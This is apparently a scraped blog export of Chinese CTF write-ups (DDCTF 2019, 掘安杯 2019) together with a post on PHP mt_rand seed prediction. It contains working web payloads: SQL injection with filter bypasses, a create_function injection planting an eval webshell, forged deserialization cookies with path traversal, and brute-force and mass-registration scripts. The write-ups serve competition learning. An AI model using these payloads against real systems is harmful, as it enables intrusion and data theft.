x5MXJAPykBsnIzX6px2V1b3xaIB4pWLOWPK+gX2q4UuhdBFVRAVySODuoA/DPwn/wAEd7XwT8TdD8b+A/Gs9lZ6TfW129vb2aRpKIJFdo2xNwGxg8H6V+gdn+x5+zYvx21r45XfhzS73xVcy29xcXz2ifaY3gUCN/N5ZiABj0xX2HNYNclN58sRsGAQ4yR2NYmseFo9X1K31RnaF7V94WM4Ep44k9RxQB/Pb8ZP+CBMf7QHxx8QfFr4qfFu/wDEWia7qM1/b+Hr7T0mtbaGVi6QIWuMbI2wR8o5A4r9p9O+HHg7wb4U03wNqpjbSLDTo9P/ALOaP9w6JH5YcqMgcDpX0VHZEwskh2l8Hjt7Cs19EW9l+1X6jeo2qBgggdCcg0AeDfBH4I/BX4DeB7bwR8EdEsPDOiLJKYF063WCMvNIXkARAMZckk9zX0jYwPa2iQyyGVlzlz1PNYVnoZmEdxfARSK2fLj+4MHjA9+9dExIOBQAPIM0zzB60xlYnNJ5bf5//XQB/9kAAP/bAEMAGxIUFxQRGxcWFx4cGyAoQisoJSUoUTo9MEJgVWVkX1VdW2p4mYFqcZBzW12FtYaQnqOrratngLzJuqbHmairpP/bAEMBHB4eKCMoTisrTqRuXW6kpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpP/AABEIAEEAPQMBIgACEQEDEQH/xAAaAAADAQEBAQAAAAAAAAAAAAAABAUDAQIG/8QANBAAAgEDAgUCAwQLAAAAAAAAAQIDAAQREiEFEzFBUXGRImGhFIHB0RUjMjNSYmNzscLw/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAH/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwD6Wlr28jsouZJnc4AHUmmT0qLxcSy3ltHbsDKuTgjIX+b6f5oGEvb5yCeGOF/urmus/E3AMcMEfykYk/QGtZDPBZLmZQ6ga3K59TgVhZ3E3IllaQ3S7FGVcZoO83iURHMgjmH9NsH13wK5JxZYmIa2uMA4Lcs4HX3rGHit0zEPaxOoOG5co1L6imOIJIEFxAWLIM6NZAYexzQN2t1FdRiSJwynuK2qVwO2McclzrjIuCG0xDCrVWgKlcKAa6vnb94sxTruFGMe+KrVG4jA1u7XtvKIpGwrA7rJuAAfzFBUmJWMkYJ7Z6Ukl+RJyxHHpB06hKMe3am4db28ZlADkAtp6A/KsVsmWYv9pmZDvoJ2FQYhbZ7rElrE7N0lUAg+viqBUFcAelYxWqpIX7+KYoJfDCILq6s8YUNzU9D2+7FVKnXJ0cXtHUY5geMn6/61RzVHam8ZP6u2HY3CA1RqdxpWaCFlUsUmRsDr1x+NA8ZEXGXAycDfvWlShYyPf65ZWaFG1qp84wPb/u9VKAJwM0kl9GzwKp1c4kKR8uvt0p3rSFrw2K2uWmVic/sqeiecUGfFzplsH6EXAGfUHaqYG1T+JxNLLZqF2EwctnpgH86oCg8O4ijZ26KCTSVvJJczPOhZAp0tGxyGGkEeh+KnJY0liaNxlHGCPIpSSwZzOqzlIpm1OoUZ6AbH7qBC+uriWaKeFuVELdn369RqG3jb61nwqW4a5aPnEswdxqLED5479aqXPD0nBVW5amN0wB/EQSfpXlOGrFcNLDI65jKAMWbGcb7n5UEcXN1EJkE8haN2BHLY5Ofx609fyMVhge4lhDRgyNkYI79ic17/AEHEdzM2cg6Qo0kjyO9NSWbyBS0xMijCnT8IPnHnG1ArYXzS3AiWRp43OtZHIBC6emABvmq9KWtmtsU0M3wxhD4bAABI87U3QFFFFB2iiigKKKKArlFFB//Z&#39;&gt;&lt;/img&gt; 于是在思考是否可以构造index.php来读取源码 构造urlhttp://117.51.150.246/index.php?jpg=TmprMlJUWTBOalUzT0RKRk56QTJPRGN3获取了index.php的源码 &lt;?php /* * https://blog.csdn.net/FengBanLiuYun/article/details/80616607 * Date: July 4,2018 */ error_reporting(E_ALL || ~E_NOTICE); header(&#39;content-type:text/html;charset=utf-8&#39;); if(! isset($_GET[&#39;jpg&#39;])) header(&#39;Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&#39;); $file = hex2bin(base64_decode(base64_decode($_GET[&#39;jpg&#39;]))); echo &#39;&lt;title&gt;&#39;.$_GET[&#39;jpg&#39;].&#39;&lt;/title&gt;&#39;; $file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;,&quot;&quot;, $file); echo $file.&#39;&lt;/br&gt;&#39;; $file = str_replace(&quot;config&quot;,&quot;!&quot;, $file); echo $file.&#39;&lt;/br&gt;&#39;; $txt = base64_encode(file_get_contents($file)); echo &quot;&lt;img src=&#39;data:image/gif;base64,&quot;.$txt.&quot;&#39;&gt;&lt;/img&gt;&quot;; /* * Can you find the flag file? * */ ?&gt; 发现提示给了一篇博客地址和一个日期 让我们找到了这样的一篇文章 尝试了多次之后发现是 http://117.51.150.246/practice.txt.swp 发现了f1ag!ddctf.php于是想读取他的源码由于index页面做过限制,·file参数只能输入字母和数字,但是他将config替换为!于是构造f1agconfigddctf.php来进行绕过。base64解密就能得到源码 &lt;?php include(&#39;config.php&#39;); $k = &#39;hello&#39;; extract($_GET); if(isset($uid)) { $content=trim(file_get_contents($k)); if($uid==$content) { echo $flag; } else { echo&#39;hello&#39;; } } ?&gt; 审计一下 发现可以绕过 得到flag DDCTF{436f6e67726174756c6174696f6e73} web签到题打开页面发现没有登陆权限 查看源代码发现了index.js里面的内容 /** * Created by PhpStorm. * User: didi * Date: 2019/1/13 * Time: 9:05 PM */ function auth() { $.ajax({ type: &quot;post&quot;, url:&quot;http://117.51.158.44/app/Auth.php&quot;, contentType: &quot;application/json;charset=utf-8&quot;, dataType: &quot;json&quot;, beforeSend: function (XMLHttpRequest) { XMLHttpRequest.setRequestHeader(&quot;didictf_username&quot;, &quot;&quot;); }, success: function (getdata) { console.log(getdata); if(getdata.data !== &#39;&#39;) { document.getElementById(&#39;auth&#39;).innerHTML = getdata.data; } },error:function(error){ console.log(error); } }); } 发现了app/Auth.php页面，而且发现了head头可以有didictf_username 尝试在app/Auth.php页面伪造header头didictf_username:admin 访问app/fL2XID2i0Cdh.php页面发现题目的源码 url:app/Application.php Class Application { var $path = &#39;&#39;; public function response($data, $errMsg = &#39;success&#39;) { $ret = [&#39;errMsg&#39; =&gt; $errMsg, &#39;data&#39; =&gt; $data]; $ret = json_encode($ret); header(&#39;Content-type: application/json&#39;); echo $ret; } public function auth() { $DIDICTF_ADMIN = &#39;admin&#39;; if(!empty($_SERVER[&#39;HTTP_DIDICTF_USERNAME&#39;]) &amp;&amp; $_SERVER[&#39;HTTP_DIDICTF_USERNAME&#39;] == $DIDICTF_ADMIN) { $this-&gt;response(&#39;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&#39;); return TRUE; }else{ $this-&gt;response(&#39;抱歉，您没有登陆权限，请获取权限后访问-----&#39;,&#39;error&#39;); exit(); } } private function sanitizepath($path) { $path = trim($path); $path=str_replace(&#39;../&#39;,&#39;&#39;,$path); $path=str_replace(&#39;..\\\\&#39;,&#39;&#39;,$path); return $path; } public function __destruct() { if(empty($this-&gt;path)) { exit(); }else{ $path = $this-&gt;sanitizepath($this-&gt;path); if(strlen($path) !== 18) { exit(); } $this-&gt;response($data=file_get_contents($path),&#39;Congratulations&#39;); } exit(); } } url:app/Session.php include &#39;Application.php&#39;; class Session extends Application { //key建议为8位字符串 var $eancrykey = &#39;&#39;; var $cookie_expiration = 7200; var $cookie_name = &#39;ddctf_id&#39;; var $cookie_path = &#39;&#39;; var $cookie_domain = &#39;&#39;; var $cookie_secure = FALSE; var $activity = &quot;DiDiCTF&quot;; public function index() { if(parent::auth()) { $this-&gt;get_key(); if($this-&gt;session_read()) { $data = &#39;DiDI Welcome you %s&#39;; $data = sprintf($data,$_SERVER[&#39;HTTP_USER_AGENT&#39;]); parent::response($data,&#39;sucess&#39;); }else{ $this-&gt;session_create(); $data = &#39;DiDI Welcome you&#39;; parent::response($data,&#39;sucess&#39;); } } } private function get_key() { //eancrykey and flag under the folder $this-&gt;eancrykey = file_get_contents(&#39;../config/key.txt&#39;); } public function session_read() { if(empty($_COOKIE)) { return FALSE; } $session = $_COOKIE[$this-&gt;cookie_name]; if(!isset($session)) { parent::response(&quot;session not found&quot;,&#39;error&#39;); return FALSE; } $hash = substr($session,strlen($session)-32); $session = substr($session,0,strlen($session)-32); if($hash !== md5($this-&gt;eancrykey.$session)) { parent::response(&quot;the cookie data not match&quot;,&#39;error&#39;); return FALSE; } $session = unserialize($session); if(!is_array($session) OR !isset($session[&#39;session_id&#39;]) OR !isset($session[&#39;ip_address&#39;]) OR !isset($session[&#39;user_agent&#39;])){ return FALSE; } if(!empty($_POST[&quot;nickname&quot;])) { $arr = array($_POST[&quot;nickname&quot;],$this-&gt;eancrykey); $data = &quot;Welcome my friend %s&quot;; foreach ($arr as $k =&gt; $v) { $data = sprintf($data,$v); } parent::response($data,&quot;Welcome&quot;); } if($session[&#39;ip_address&#39;] != $_SERVER[&#39;REMOTE_ADDR&#39;]) { parent::response(&#39;the ip addree not match&#39;.&#39;error&#39;); return FALSE; } if($session[&#39;user_agent&#39;] != $_SERVER[&#39;HTTP_USER_AGENT&#39;]) { parent::response(&#39;the user agent not match&#39;,&#39;error&#39;); return FALSE; } return TRUE; } private function session_create() { $sessionid = &#39;&#39;; while(strlen($sessionid) &lt; 32) { $sessionid .= mt_rand(0,mt_getrandmax()); } $userdata = array( &#39;session_id&#39; =&gt; md5(uniqid($sessionid,TRUE)), &#39;ip_address&#39; =&gt; $_SERVER[&#39;REMOTE_ADDR&#39;], &#39;user_agent&#39; =&gt; $_SERVER[&#39;HTTP_USER_AGENT&#39;], &#39;user_data&#39; =&gt; &#39;&#39;, ); $cookiedata = serialize($userdata); $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata); $expire = $this-&gt;cookie_expiration + time(); setcookie( $this-&gt;cookie_name, $cookiedata, $expire, $this-&gt;cookie_path, $this-&gt;cookie_domain, $this-&gt;cookie_secure ); } } $ddctf = new Session(); $ddctf-&gt;index(); 其中发现了已一些危险函数unserialize，以及file_get_contents等等 这里存在类的反序列化应用 猜测flag可能藏在../config/key.txt里面 大概知道题目的大概流程为： 通过session反序列化 –&gt;创建Application对象–&gt; 控制path –&gt; getfalg $session = $_COOKIE[$this-&gt;cookie_name]; if(!isset($session)) { parent::response(&quot;session not found&quot;,&#39;error&#39;); return FALSE; } $hash = substr($session,strlen($session)-32); $session = substr($session,0,strlen($session)-32); if($hash !== md5($this-&gt;eancrykey.$session)) { parent::response(&quot;the cookie data not match&quot;,&#39;error&#39;); return FALSE; } $session = unserialize($session); 细看代码，发现签名规则是md5(eancrykey+session)，也就是说，我们要想获得cookie控制权，必须得到eancrykey。通读代码，分析eancrykey出现地点。最终发现两个可疑点 eancrykey存放目录为../config/key.txt。 由于不在web目录且没有读文件的漏洞，此时攻击者不可获取。 某处代码中的调用 本地测试了一下 sprintf函数 &lt;?php $data=&quot;Welcome my friend %s&quot;; $arr=array(&#39;chuddy&#39;,&#39;chuddy123&#39;); foreach ($arr as $value) { echo sprintf($data,$value).&quot;&lt;br&gt;&quot;; } ?&gt; 输出结果为： Welcome my friend chuddy Welcome my friend chuddy123 于是想到构造方法：nickname=%s就可以得到eancrykey的值 然后就是伪造一个session值： private function sanitizepath($path) { $path = trim($path); $path=str_replace(&#39;../&#39;,&#39;&#39;,$path); $path=str_replace(&#39;..\\\\&#39;,&#39;&#39;,$path); return $path; } public function __destruct() { if(empty($this-&gt;path)) { exit(); }else{ $path = $this-&gt;sanitizepath($this-&gt;path); if(strlen($path) !== 18) { exit(); } $this-&gt;response($data=file_get_contents($path),&#39;Congratulations&#39;); } 发现这个path值 过滤了../可以进行双写绕过 于是构造Application类 &lt;?php class Application{ var $session_id = &#39;5c5d2e08abcb1f7f32228b19935a9fb5&#39;; var $ip_address = &#39;117.158.83.66&#39;; var $user_agent = &#39;Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:66.0)+Gecko/20100101+Firefox/66.0&#39;; var $user_data = &#39;&#39;; var $path = &#39;....//config/flag.txt&#39;; } $a = new Application(); $a = serialize($a); echo urlencode($a.md5(&#39;EzblrbNS&#39;.$a)); ?&gt; 得到flag DDCTF{ddctf2019_G4uqwj6E_pHVlHIDDGdV8qA2j} Upload-IMG打开页面发现是一个文件上传的题目 先随便传一个图片看一下 发现这个是需要经过二次渲染之后 还能找到 phpinfo() 这一串字符串 让我想到了 以前做过的 upload-labs的第十六关 二次渲染绕过 参考了当时讲课的时候的学长的博客 于是开始制作一个 能过绕过二次渲染的图片 首先保存一个 已经被渲染的图片 命名为 1.jpg 然后用脚本开始跑图片其中关键字改为phpinfo()就可以了 php phpinfo.php 1.jpg 制作完成一张 合格的图片 然后上传 就会得到flag： 大吉大利，今晚吃鸡打开页面是一个 类似吃鸡模式的游戏 首先获得入场券，然后淘汰其他选手就能获得flag 首先购买入场券 通过抓包发现ticket_price=2000这个参数可以进行修改，但是只能改大不能改小，于是想到了php的整形溢出 令ticket_price=4294967296 就可以买到入场券 进入游戏 然后想到了利用python写脚本注册大量的用户 然后再把它们移除 脚本为： import re import requests import sys reload(sys) sys.setdefaultencoding(&quot;utf8&quot;) id = open(&quot;1.txt&quot;, &quot;a&quot;) ticket = open(&quot;2.txt&quot;,&quot;a&quot;) for i in range(150): register_url = &quot;http://117.51.147.155:5050/ctf/api/register&quot; r = requests.session() register_playload = &quot;?name=chuddy1234chuddy123chuddy123chuddy123chuddy123&quot;+str(i)+&quot;&amp;password=123456789a&quot; # print register_playload s = r.get(url=register_url+register_playload) # print s.text tick_url = &quot;http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296&quot; tick = r.get(url=tick_url) a = tick.text bill_id = re.search(r&#39;id&quot;:&quot;(.*)&quot;,&quot;tick&#39;,a).group(1) # print bill_id pay_url = &quot;http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=&quot;+bill_id pay = r.get(url=pay_url) success = &#39;{&quot;code&quot;:200,&quot;data&quot;:[{&quot;your_id&quot;:75,&quot;your_ticket&quot;:&quot;4c529f4afa586f5d8e1e8bd89a6f28dd&quot;}],&quot;msg&quot;:&quot;\\u4ea4\\u6613\\u6210\\u529f&quot;}&#39; pay_id1 = re.search(r&#39;your_id&quot;:(.*),&quot;you&#39;,pay.text).group(1) pay_ticket1 = re.search(r&#39;your_ticket&quot;:&quot;(.*)&quot;}],&quot;msg&quot;&#39;,pay.text).group(1) print pay_id1 print pay_ticket1 id.write(pay_id1) id.write(&quot;\\n&quot;) ticket.write(pay_ticket1) ticket.write(&quot;\\n&quot;) 这个可以获得大量的注册的用户，再用bp跑一下 将他们清除掉就可以获得flag了 跑完脚本就能得到flag了 flag: DDCTF{chiken_dinner_hyMCX[n47Fx)}","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"php伪随机数","slug":"php伪随机数","date":"2019-04-20T08:18:10.000Z","updated":"2019-06-13T10:58:12.840Z","comments":true,"path":"2019/04/20/php伪随机数/","link":"","permalink":"http://yoursite.com/2019/04/20/php伪随机数/","excerpt":"php伪随机数前言这一段遇到了一个关于伪随机数的题目，当时没有做出来，看完writeup之后，感觉很有意思，所以就记录下来","text":"php伪随机数前言这一段遇到了一个关于伪随机数的题目，当时没有做出来，看完writeup之后，感觉很有意思，所以就记录下来 php伪随机数漏洞php中重要的几个随机函数 rand() 不指定参数时，范围0-32767 mt_rand() 不指定参数时，范围0-2^32-1 srand() 给rand()函数播种 mt_srand() 给mt_srand()函数播种 php是基于C开发的，C中生成随机数时，需要自己去一个种子，相同的种子产生的随机数是相同的，php中也一样 自己的理解：mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数。 所以，当种子一定时，接下来几次的随机数都是固定的 测试代码： &lt;?php mt_srand(1433223); echo mt_rand().&quot;&lt;br&gt;&quot;; echo mt_rand().&quot;&lt;br&gt;&quot;; echo mt_rand().&quot;&lt;br&gt;&quot;; echo mt_rand().&quot;&lt;br&gt;&quot;; echo mt_rand().&quot;&lt;br&gt;&quot;; ?&gt; 页面输出： 2068220702 2001673607 410303409 475448501 1250041484 发现随机种子 确定下来 无论怎么刷新 页面返回的一直是这几个随机数 同时我们应该注意，mt_srand()函数播种的时候，只有在第一次调用mt_rand()函数的时候才会使用。所以如果我们知道了第一次生成的随机数值，就可能爆破出随机数种子。 工具链接： php伪随机数 发现爆出了5个可能的种子通过验证可以知道那个是正确的种子 注意：如果不是第一次生成的随机数，爆出来的种子，不一定正确 在 php &gt; 4.2.0 的版本中，不再需要用 srand() 或 mt_srand() 函数给随机数发生器播种，现已由 PHP 自动完成。php 中产生一系列的随机数时，只进行了一次播种，而不是每次调用 mt_rand() 都进行播种。","categories":[],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://yoursite.com/tags/web漏洞/"}]},{"title":"2019掘安杯writeup","slug":"掘安杯writeup","date":"2019-04-10T08:05:29.172Z","updated":"2019-06-05T09:01:22.364Z","comments":true,"path":"2019/04/10/掘安杯writeup/","link":"","permalink":"http://yoursite.com/2019/04/10/掘安杯writeup/","excerpt":"2019掘安杯writeupweb","text":"2019掘安杯writeupweb web签到题打开题目链接发现 点击之后是一个404页面 果断选择抓包 发现： 感觉像是base64编码 于是解码获得flag： jactf{jasafe110qweasdzxc} 下载下载打开链接发现下载了一个flag.txt 于是开始思考别的 查看源代码发现 &lt;html&gt; &lt;head&gt; &lt;title&gt;下载下载&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;a href=&quot;?file=flag.txt&quot;&gt;下载flag文件&lt;/a&gt; &lt;!-- &lt;a href=&quot;flag.php&quot;&gt;flag&lt;/a&gt; --&gt; &lt;/body&gt; &lt;/html&gt; 于是尝试下载flag.php http://120.79.1.69:10002/?file=flag.php flag.php的内容为一种加密解密的方式 &lt;?php header(&#39;Content-Type: text/html; charset=utf-8&#39;); //网页编码 function encrypt($data, $key) { $key = md5 ( $key ); $x = 0; $len = strlen ( $data ); $l = strlen ( $key ); for($i = 0; $i &lt; $len; $i ++) { if ($x == $l) { $x = 0; } $char .= $key {$x}; $x ++; } for($i = 0; $i &lt; $len; $i ++) { $str .= chr ( ord ( $data {$i} ) + (ord ( $char {$i} )) % 256 ); } return base64_encode ( $str ); } function decrypt($data, $key) { $key = md5 ( $key ); $x = 0; $data = base64_decode ( $data ); $len = strlen ( $data ); $l = strlen ( $key ); for($i = 0; $i &lt; $len; $i ++) { if ($x == $l) { $x = 0; } $char .= substr ( $key, $x, 1 ); $x ++; } for($i = 0; $i &lt; $len; $i ++) { if (ord ( substr ( $data, $i, 1 ) ) &lt; ord ( substr ( $char, $i, 1 ) )) { $str .= chr ( (ord ( substr ( $data, $i, 1 ) ) + 256) - ord ( substr ( $char, $i, 1 ) ) ); } else { $str .= chr ( ord ( substr ( $data, $i, 1 ) ) - ord ( substr ( $char, $i, 1 ) ) ); } } return $str; } $key=&quot;MyCTF&quot;; $flag=&quot;o6lziae0xtaqoqCtmWqcaZuZfrd5pbI=&quot;;//encrypt($flag,$key) ?&gt; 只需在代码下面添加 echo decrypt($flag,$key); 运行就可以得到flag myCTF{cssohw456954GUEB} 猜密码题目暂时下架了 该网站已被黑打开页面发现网站被黑 于是用御剑扫到后门 shell.php 开始爆破管理员密码为 hack即可得到flag jactf{DWDASFASCASFAFASFNKAS} not_easy发现是个代码审计类的题目： &lt;?php error_reporting(0); if(isset($_GET[&#39;action&#39;])) { $action = $_GET[&#39;action&#39;]; } if(isset($_GET[&#39;action&#39;])){ $arg = $_GET[&#39;arg&#39;]; } if(preg_match(&#39;/^[a-z0-9_]*$/isD&#39;, $action)){ show_source(__FILE__); } else { $action($arg,&#39;&#39;); } 想到了匿名函数绕过 但是他这里有一个正则匹配的问题 看了别人的blog才知道 \\可以绕过这个 在PHP的命名空间默认为\\，所有的函数和类都在\\这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。 于是想到绕过方式： http://120.79.1.69:10006/?action=\\create_function&amp;arg=){}phpinfo();/* 于是可以构造一个木马： http://120.79.1.69:10006/?action=\\create_function&amp;arg=){}eval($_POST[&#39;chuddy&#39;]);/* 就可以得到flag： jactf{c795359da56ae38ec9132eaad24733fc} 曲折的人生打开页面发现了登陆框 发现可以联合注入 通过测试发现过滤了： 空格：用/*1*/绕过 union：双写绕过ununionion select: 双写绕过selselctect or：双写绕过oorr 于是开始爆值： 爆出username：goodboy_g-60Hellowor 登录的时候要注意，用户名中也存在一个or，所以也要进行双写绕过 admin&#39;ununionion/*1*/selecselectt/*1*/1,(selselectect/*1*/group_concat(username)/*1*/from/*1*/admin),3&#39;# 爆出password为 ajahas&amp;&amp;*44askldajaj admin&#39;ununionion/*1*/selecselectt/*1*/1,(selselectect/*1*/group_concat(passwoorrd)/*1*/from/*1*/admin),3&#39;# 接下来就是下面验证码的问题 需要用脚本来跑 #!/usr/bin/python #coding=utf-8 import re import requests import sys reload(sys) sys.setdefaultencoding(&quot;utf8&quot;) data={ &#39;username&#39;:&#39;goodboy_g-60Hellowoorr&#39;, &#39;password&#39;:&#39;ajahas&amp;&amp;*44askldajaj&#39; } for i in range(100000000): s = requests.Session() url=&quot;http://120.79.1.69:10005/index.php&quot; r = s.post(url=url,data=data) match = re.search(r&quot;&lt;div class=&#39;rep&#39;&gt;.*&lt;/div&gt;&quot;,r.text).group(0) match = str(match) match = re.sub(&quot;&lt;div class=&#39;rep&#39;&gt;&quot;,&#39;&#39;,match) match = re.sub(&quot;&lt;/div&gt; &lt;/div&gt;&quot;,&#39;&#39;,match) match = re.sub(&quot;（&quot;,&#39;(&#39;,match) match = re.sub(&quot;）X&quot;,&#39;)*&#39;,match) match = re.sub(&quot;）/&quot;,&#39;)/&#39;,match) match = re.sub(&quot;）&quot;,&#39;)&#39;,match) match = eval(match) print match d = { &#39;username&#39;:&#39;goodboy_g-60Hellowoorr&#39;, &#39;password&#39;:&#39;ajahas&amp;&amp;*44askldajaj&#39;, &quot;code&quot;: match } r = s.post(url=url+&quot;?check&quot;,data=d) if &quot;验证码正确&quot; in r.text: print r.text break 跑出来了一个压缩包地址 和密码： 这里面有获取flag.zip的密码获取方式 Private Function getPassword(ByVal str As String) As String Dim reString As String Dim i As Integer i = 1 While (i &lt;= Len(str)) reString = reString &amp; Mid(str, i, 1) i = i + (i Mod 5) Wend getPassword = reString End Function Private Sub Command1_Click() Dim Dictionary As String Dictionary = &quot;VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU=&quot; Dim password As String password = getPassword(Dictionary) Dim psw As String psw = Text1.Text If (psw = password) Then MsgBox &quot;The password is correct!&quot;, vbOKOnly, &quot;密码正确&quot; Text1.Text = &quot;Password for next pass : &quot; &amp; getPassword(password) Else MsgBox &quot;PasswordFail!&quot;, vbOKOnly, &quot;密码错误&quot; End If End Sub 写出解密脚本： str = &quot;VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU&quot; print len(str) flag = &quot;&quot; flag1 = &quot;&quot; i =1 while i &lt;= len(str): flag += str[i-1:i] i = i + (i%5) i=1 while i &lt;= len(flag): flag1 += flag[i-1:i] i = i + (i%5) print flag1 密码为：VmH0wW3DZalBnmmSalV1SYSGRr1r3jVYcFrHWkUUlhljkFzCbXaEKyaVJymT1FlVTVskVWhGtonaGU2WWGhVXYol1WVI1F2odFuk 解压缩flag.zip之后发现图片打不开，用winhex打开发现flag flag{Good luck!} audit发现是代码审计 &lt;?php highlight_file(__FILE__); include(&#39;flag.php&#39;); $str1 = @$_GET[&#39;str1&#39;]; $str2 = @$_GET[&#39;str2&#39;]; $str3 = @$_GET[&#39;str3&#39;]; $str4 = @$_GET[&#39;str4&#39;]; $str5 = (string)@$_POST[&#39;str5&#39;]; $str6 = (string)@$_POST[&#39;str6&#39;]; $str7 = (string)@$_POST[&#39;str7&#39;]; if( $str1 == $str2 ){ die(&#39;str1 OR Sstr2 no no no&#39;); } if( md5($str1) != md5($str2) ){ die(&#39;step 1 fail&#39;); } if( $str3 == $str4 ){ die(&#39;str3 OR str4 no no no&#39;); } if ( md5($str3) !== md5($str4)){ die(&#39;step 2 fail&#39;); } if( $str5 == $str6 || $str5 == $str7 || $str6 == $str7 ){ die(&#39;str5 OR str6 OR str7 no no no&#39;); } if (md5($str5) !== md5($str6) || md5($str6) !== md5($str7) || md5($str5) !== md5($str7)){ die(&#39;step 3 fail&#39;); } if(!($_POST[&#39;a&#39;]) and !($_POST[&#39;b&#39;])) { echo &quot;come on!&quot;; die(); } $a = $_POST[&#39;a&#39;]; $b = $_POST[&#39;b&#39;]; $m = $_GET[&#39;m&#39;]; $n = $_GET[&#39;n&#39;]; if (!(ctype_upper($a)) || !(is_numeric($b)) || (strlen($b) &gt; 6)) { echo &quot;a OR b fail!&quot;; die(); } if ((strlen($m) &gt; 4) || (strlen($n) &gt; 4)) { echo &quot;m OR n fail&quot;; die(); } $str8 = hash(&#39;md5&#39;, $a, false); $str9 = strtr(hash(&#39;md5&#39;, $b, false), $m, $n); echo &quot;&lt;p&gt;str8 : $str8&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;str9 : $str9&lt;/p&gt;&quot;; if (($str8 == $str9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === 6)) { echo &quot;You&#39;re great,give you flag:&quot;; echo $flag; } str1 OR Sstr2 no no no 第一步就是利用弱类型绕过。 第二步就是数组绕过。 str1[]=1&amp;str2[]=2&amp;str3[]=3&amp;str4[]=4就可绕过 但是str5,str6,str7强行转为字符串，数组绕过的方法就行不通了只能用MD5强碰撞 str5 = open(&quot;./md5/out_test_000.txt&quot;,&quot;rb&quot;).read() str6 = open(&quot;./md5/out_test_001.txt&quot;,&quot;rb&quot;).read() str7 = open(&quot;./md5/out_test_002.txt&quot;,&quot;rb&quot;).read() 工具地址为：https://github.com/thereal1024/python-md5-collision 然后就是最后一层的了 需要传递四个参数a,b,m,n$a为大写字母，$b为数字、并且长度为6，$m和$n长度小于4$str8为$ahash加密后的值，$str9为$bhash加密后，把$m替换为$n,要求$str8== $str9。还是用的弱类型。a可以为：QNKCDZO如果$b为hash加密后0e开头，可以满足，长度为6不能满足，但是还有次替换，只需要把0e后不是数字的替换为数字就可以。 然后开始构造：脚本为： import requests import sys reload(sys) sys.setdefaultencoding(&quot;utf8&quot;) url = &quot;http://120.79.1.69:10007/?str1[]=1&amp;str2[]=2&amp;str3[]=3&amp;str4[]=4&amp;m=dcb&amp;n=123&quot; str5 = open(&quot;./md5/out_test_000.txt&quot;,&quot;rb&quot;).read() str6 = open(&quot;./md5/out_test_001.txt&quot;,&quot;rb&quot;).read() str7 = open(&quot;./md5/out_test_002.txt&quot;,&quot;rb&quot;).read() data= { &#39;str5&#39;:str5, &#39;str6&#39;:str6, &#39;str7&#39;:str7, &#39;a&#39;:&#39;QNKCDZO&#39;, &#39;b&#39;:&#39;259987&#39; } s = requests.post(url=url,data=data) print s.text 得到flag： jactf{c795359da56ae38ec9132eaad24733fc} miscmisc签到关注公众号 获得flag jactf{051bb6f64e70cc8766d62c3ea008eaee} so_easy下载下来发现是个打不开的exe文件 于是放在winhex下 发现有点像base加密尝试了一下发现是base58加密 进行解密发现了像是图片转的base64 data:image/bmp;base64, 